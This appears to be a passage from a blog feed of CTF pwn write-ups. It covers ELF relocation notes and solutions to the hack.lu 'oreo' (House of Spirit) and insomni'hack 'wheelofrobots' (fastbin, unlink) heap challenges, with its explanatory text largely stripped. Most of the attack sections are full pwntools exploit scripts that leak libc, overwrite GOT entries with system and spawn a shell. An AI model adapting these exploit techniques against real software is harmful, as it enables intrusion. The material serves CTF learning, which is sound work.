src="/2023/03/19/23-2-21-elf/image-20230319004959046.png" alt="image-20230319004959046"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;<span class="number">8</span><span class="comment">/* Address */</span>got</span><br><span class="line">  Elf64_Xword    r_info;<span class="number">8</span><span class="comment">/* Relocation type and symbol index */</span><span class="number">32</span><span class="number">32</span><span class="number">1</span></span><br><span class="line">  Elf64_Sxword    r_addend;<span class="number">8</span><span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014528225.png" alt="image-20230319014528225"></p><p></p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014737236.png" alt="image-20230319014737236"></p><p>0x1040+0x344&#x3D;1384</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014926764.png" alt="image-20230319014926764"></p><p>ida</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319015029874.png" alt="image-20230319015029874"></p></li><li><p> d_tag&#x3D;7 sized_tag&#x3D;8</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319123925728.png" alt="image-20230319123925728"></p><p></p></li><li><p> #define DT_GNU_HASH0x6ffffef5&#x2F;* GNU-style hash table.  *&#x2F;</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319134353748.png" alt="image-20230319134353748"></p><p> DT_GNU_HASH </p></li></ul></li><li><p>Read-only After Relocation</p><p>segment<img src="/2023/03/19/23-2-21-elf/image-20230223005339928.png" alt="image-20230223005339928"></p></li></ul><p>0x232b0memsz 3208byte</p><h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><ul><li>Section header table<ul><li>ELF</li><li></li><li></li></ul></li></ul><p>section Header Table(linker)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">//  .shstrtab </span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// </span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// </span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// </span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// </span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/19/23-2-21-elf/image-20230222232634953.png" alt="image-20230222232634953"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Spirit 2014 hack.lu oreo</title>
      <link href="/2023/03/17/2014-hack-lu-oreo/"/>
      <url>/2023/03/17/2014-hack-lu-oreo/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec oreo</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/oreo&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>add</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure><p>namescript56</p><p>nextputsgotshow</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048774                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048777                 mov     [esp+4], eax</span><br><span class="line">.text:0804877B                 mov     dword ptr [esp], offset aDescriptionS ; &quot;Description: %s\n&quot;</span><br><span class="line">.text:08048782                 call    _printf</span><br></pre></td></tr></table></figure><p>eaxnexteax%sgot</p><p>puts_got&#x3D;elf.got[puts]<br>payload1 &#x3D; ba*27+p32(puts_got)<br>add(ba*25,payload1)<br>show_rifle()</p><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p></p><ul><li>fake chunk  ISMMAP  1 free  mmap  chunk</li><li>fake chunk  MALLOC_ALIGN_MASK</li><li>fake chunk  size  fastbin </li><li>fake chunk  next chunk  <code>2 * SIZE_SZ</code><code>av-&gt;system_mem</code> </li><li>fake chunk  fastbin  fake chunk double free </li></ul><p>nextfree(next),noticenoticesize0804A2A8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: add+C5r</span><br><span class="line">.bss:0804A2A4                                         ; add+CDw ...</span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice          dd ?                    ; DATA XREF: message+23r</span><br><span class="line">.bss:0804A2A8                                         ; message+3Cr ...</span><br></pre></td></tr></table></figure><p>addmalloc(0x38),size0x38+0x80x40chunknext0804A2A8chunk nextfree chunk-&gt;next0804A2A80804A2c0</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230318005107301.png" alt="image-20230318005107301"></p><p>padding0x20fake chunkprev sizesize</p><p>freefastbin0804A2A0chunk__isoc99_sscanfgot</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230317234423315.png" alt="image-20230317234423315"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./oreo&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">descrip, name</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.sendline(descrip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_rifle</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">notice</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendline(notice)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x08048748&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(puts_got)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload1)</span><br><span class="line">show_rifle()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">25</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x41</span>)+p32(<span class="number">0x50</span>)</span><br><span class="line">message(payload3)</span><br><span class="line">order()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sscanf_got = elf.got[<span class="string">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class="line">add(p32(sscanf_got),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">message(p32(system_addr))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 insomni&#39;hack wheelofrobots</title>
      <link href="/2023/03/16/2017-insomn-hack-wheelofrobots/"/>
      <url>/2023/03/16/2017-insomn-hack-wheelofrobots/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni&#39;hack_wheelofrobots</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec wheelofrobots</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/wheelofrobots&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>robots</p><p>0x6030e0- robot 4<br>0x6030e8- robot 6<br>0x6030f0- robot 2<br>0x6030f8- robot 1<br>0x603100- robot 3<br>0x603108- robot 5</p><p></p><p>0x603138- robot 2<br>0x603140- robot 3<br>0x603148- robot 6</p><p>add()num &#x3D; read_num((char *)&amp;choice, 5uLL);off by onerobots 2inuse</p><h3 id="fastbin-attach"><a href="#fastbin-attach" class="headerlink" title="fastbin attach"></a>fastbin attach</h3><p>robots2fastbin0x20freechunk</p><p>fast bin0x20chunkoffbyonechunkrobots2+0x10user datafdfree chunk0x20chunkfastbin size&#x3D;0x21free chunk+0x8&#x3D;0x210x603138robots3size0x21</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png" alt="image-20230316234451675"></p><p>0x603138chunk0x603138+0x10&#x3D;0x603148,robot 6size</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>,bb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>0x6030E80x6030D0</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png" alt="image-20230317002742295"></p><p>2 6 1  puts free atoi</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">change(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;oice : &#x27;</span>,<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p>payload &#x3D; p64(0)*2 + ba*0x18 + p64(0x6030e8)<br>change(6,payload)</p><p>16</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br></pre></td></tr></table></figure><p>start_robotexithookexitgotleave retret</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png" alt="image-20230317005523642"></p><p>got</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png" alt="image-20230317003427076"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./wheelofrobots&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_bin_main_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *0x004014B8&#x27;)#change 2</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401314&#x27;)#remove 3</span></span><br><span class="line">db(<span class="string">&#x27;b *0x401725&#x27;</span>)<span class="comment">#exit</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># first way++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># overflow_benderinuse(b&#x27;\x01&#x27;)</span></span><br><span class="line"><span class="comment"># payload = p64(0)*3+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span></span><br><span class="line"><span class="comment"># change(6,payload)</span></span><br><span class="line"><span class="comment"># change(6,p64(puts_plt))</span></span><br><span class="line"><span class="comment"># remove(2)</span></span><br><span class="line"><span class="comment"># puts_ad=u64(r(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># p(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># base=puts_ad-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system=libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line"><span class="comment"># change(1,p64(system))</span></span><br><span class="line"><span class="comment"># sla(b&#x27;oice : &#x27;,b&#x27;sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second way+++++++++++++++++++</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span 